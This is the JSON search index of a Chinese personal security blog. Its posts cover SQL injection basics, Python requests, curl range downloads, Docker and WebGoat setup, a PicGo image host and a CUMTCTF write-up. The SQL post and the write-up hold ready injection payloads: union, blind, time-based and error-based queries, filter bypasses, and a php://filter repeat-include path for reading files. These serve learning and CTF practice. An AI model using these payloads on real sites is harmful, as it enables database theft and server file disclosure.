{"meta":{"title":"Lcdm123","subtitle":"","description":"","author":"海马少年","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"SQL注入基础","slug":"SQL注入基础","date":"2020-10-14T04:47:08.000Z","updated":"2020-10-14T07:08:57.726Z","comments":true,"path":"2020/10/14/SQL注入基础/","link":"","permalink":"http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入； 按返回结果分类有： 报错注入 盲注入；","text":"注入类型SQL注入有许多类型：按参数分类有：数字型注入与字符型注入； 按返回结果分类有： 报错注入 盲注入； 注入操作 判断数字型注入与字符型注入id=1 正确id=1’ 错误id=1 and 1=1 正确id=1 and 1=2 错误则根据上述情况一般可以确定为数字型注入；字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别； 注入的一般语句使用 order by 确定字段数 并判断回显位置；查库名 id= -1 union select schema_name from information_schema.schemata –+查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名” –+查字段的值 id=-1 union select 字段名 from 表名 –+ 盲注入 盲注入分为：基于时间盲注入与基于布尔的盲注入； 相关函数： sleep() 延时返回 substr(string,n,m)从字符串的第n个位置开始截取m个字符 if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3; 基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用； id=1 and length(database())&gt;n –+ 判断数据库的名字长度； id=1 and substr(database(),1,1)&gt;’字符’ –+ 判断数据库名字； id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=’字符’ –+ 判断表名； id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=’表名’ limit 0,1), 1, 1 )=’字符’ –+ 判断字段； id=1 and substr((select 字段 from 表名 limit 0,1))=’’ –+ 判断值； 延时注入：适用与页面回显不变时； id=1 and if((database()=’’),sleep(3),null)；其余类似只需要改变判断条件即可； 报错注入（利用数据库的报错信息来获取我们需要的东西） 函数 作用 count() 统计select 返回的记录条数 concat() 字符串连接功能 floor() 向下取整 rand() 生成0~1 之间的随机浮点数 group by 根据一个或多个列对结果进行排序 floor(rand(0)*2) 产生随机数0或1 updatexml() mysql 5.1.5 extractvalue() mysql 5.1.5 函数利用 id=1 and select count(*), concat( (…) , 0x7e , floor(rand(0)*2))x from information_schema.tables group by x –+； id=1 and select 1 from (select counut(*), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+； id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位； id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位； 格式化注入 sprintf()将格式化字符串写入变量中； sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成； 该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\\，那么PHP会把\\当作一个格式化字符的类型而吃掉,最后%\\或%1$\\被替换为空； addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义； 输入 %1$’ 变成 %1$&#39; 单引号成功逃逸； 绕过 双写绕过；oorr ununionion seselectlect …… 大小写绕过 编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）； 内联注释绕过","categories":[],"tags":[]},{"title":"python的requests库应用","slug":"python的requests库应用","date":"2020-10-13T14:24:20.000Z","updated":"2020-10-13T14:25:07.743Z","comments":true,"path":"2020/10/13/python的requests库应用/","link":"","permalink":"http://example.com/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/","excerpt":"Python requests库基本操作","text":"Python requests库基本操作 1234567891011121314#发送get请求：response = requests.get(url,params= )#发送Post请求：response = requests.post(url,data= ) #获取正文内容：print(response.text)#获取响应状态码print(response.status_code)#定制请求头部response = requests.post(url,headers= ) #修改cookiesresponse = requests.post(url , cookies= )#设置请求超时的时间response = requests.post(url, timeout= 0.001) 基本说明 属性 说明 r.status_code HTTP请求的返回状态 r.text HTTP响应内容的字符串形式，即url对应的页面内容 r.encoding 从HTTP header中猜测的响应内容编码 r.apparent_encoding 从内容中分析出的响应内容编码方式 r.content HTTP响应内容的二进制形式（图片的还原）","categories":[],"tags":[]},{"title":"Curl分片下载","slug":"Curl分片下载","date":"2020-10-12T04:37:58.000Z","updated":"2020-10-12T04:55:46.625Z","comments":true,"path":"2020/10/12/Curl分片下载/","link":"","permalink":"http://example.com/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/","excerpt":"2020 年 天翼杯签到题题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag","text":"2020 年 天翼杯签到题题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag 当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载curl分片下载前提服务器需要支持 HTTP Range Request，可以用curl查看请求头，例如： curl -I http://mirrors.ustc.edu.cn/debian-cd/amd64/ios-cd/debian-mac-9.3.0-amd64-netinst.iso若返回结果内包含：Accept-Ranges:bytes ，则说明这个服务器是支持 HTTP Range Request的；若结果不包含，则可能不支持；若结果包含Accept-Ranges:none 则表示不支持； 下载 curl --range 0-5000000000 -o part1 &lt;url&gt; –range 指定下载的某一片段；此处指定的片段大小约为50G左右； 合并拼接 cat part1 part2 &gt; outputfile 此处应该注意片段文件的顺序拼接的方法有cat和dd，cat比较简单，容易使用；","categories":[],"tags":[]},{"title":"ubuntu安装Docker","slug":"ubuntu安装Docker","date":"2020-10-12T04:36:18.000Z","updated":"2020-10-12T04:54:15.581Z","comments":true,"path":"2020/10/12/ubuntu安装Docker/","link":"","permalink":"http://example.com/2020/10/12/ubuntu%E5%AE%89%E8%A3%85Docker/","excerpt":"安装123456789101112sudo apt-get updatesudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common # step 2: 安装GPG证书curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add - # Step 3: 写入软件源信息sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot; # Step 4: 更新并安装Docker-CEsudo apt-get -y updatesudo apt-get -y install docker-ce #设置开机自启 docker开机自启：sudo systemctl enable docker.service容器开机自启：启动容器时加上 –restart=always","text":"安装123456789101112sudo apt-get updatesudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common # step 2: 安装GPG证书curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add - # Step 3: 写入软件源信息sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot; # Step 4: 更新并安装Docker-CEsudo apt-get -y updatesudo apt-get -y install docker-ce #设置开机自启 docker开机自启：sudo systemctl enable docker.service容器开机自启：启动容器时加上 –restart=always 换源12345678sudo mkdir -p &#x2F;etc&#x2F;dockersudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;&#123; &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;xx0cvw91.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker","categories":[],"tags":[]},{"title":"Docker搭建webgoat","slug":"Docker搭建webgoat","date":"2020-10-12T04:35:16.000Z","updated":"2020-10-12T04:54:23.036Z","comments":true,"path":"2020/10/12/Docker搭建webgoat/","link":"","permalink":"http://example.com/2020/10/12/Docker%E6%90%AD%E5%BB%BAwebgoat/","excerpt":"虚拟机：Ubuntu18 服务器版","text":"虚拟机：Ubuntu18 服务器版 开始搭建 在虚拟机上安装docker； $ sudo docker search webgoat 查找webgoat镜像； $ sudo docker pull webgoat/webgoat-8.0 拉取镜像； $ sudo docker run -dt --name webgoat -p 8080:8080 --rm webgoat/webgoat-8.0 开启镜像服务； 使用浏览器访问：ip:8080/WebGoat 即可； 自己创建账户登录，即可使用，全英文界面可能对和我一样的英语白痴来说不太友好； 网上看到一些其他的开启镜像的方法，我使用的时候一直卡着启动不了。 联合搭建webgoat与webwolf 使用docker拉取镜像：sudo docker pull webgoat/goatandwolf 启动镜像：sudo docker run -d -p 8081:8080 -p 9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf 可能会出现浏览器兼容问题","categories":[],"tags":[]},{"title":"PicGo+github图床","slug":"PicGo-github图床","date":"2020-10-12T04:33:41.000Z","updated":"2020-10-12T05:34:29.269Z","comments":true,"path":"2020/10/12/PicGo-github图床/","link":"","permalink":"http://example.com/2020/10/12/PicGo-github%E5%9B%BE%E5%BA%8A/","excerpt":"PicGo安装PicGo软件；","text":"PicGo安装PicGo软件； 创建GitHub图床创建GitHub账户并且建立一个厂库，用于存储自己的图片；配置PicGo 上图的Token需要在自己的github账户上获取 然后选择最下方的创建即可； 配置成功后，之后偶尔上传图片时可能会出现错误，可以重启PicGo即可（别问为什么，玄学）","categories":[],"tags":[]},{"title":"CUTMCTF","slug":"CUTMCTF","date":"2020-10-12T04:29:03.000Z","updated":"2020-10-12T04:55:49.828Z","comments":true,"path":"2020/10/12/CUTMCTF/","link":"","permalink":"http://example.com/2020/10/12/CUTMCTF/","excerpt":"web签到","text":"web签到 步骤 打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可； 传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite 在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码； 明显是使用PHP伪协议查看源文件即可获得flag base64解码即可 Babysqli使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格； 并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询 发现flag，成功 Secret发现图片，并且下载图片，按文本格式打开，后发现php代码 进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents($str1)是指需要str1以文件的形式写入值，is_numeric($str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag； 使用十六进制绕过sleep()函数； 使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容 关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/ Babysqli2按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号； 绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用； 由于flag的开头为C 所以就尝试猜测flag在password中的位置 结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为 CUMTCTF{}，大括号内全为小写； 简单文件包含页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应 然后尝试使用client-ip:127.0.0.1 成功； 发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的； 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php base64解码即可","categories":[],"tags":[]}],"categories":[],"tags":[]}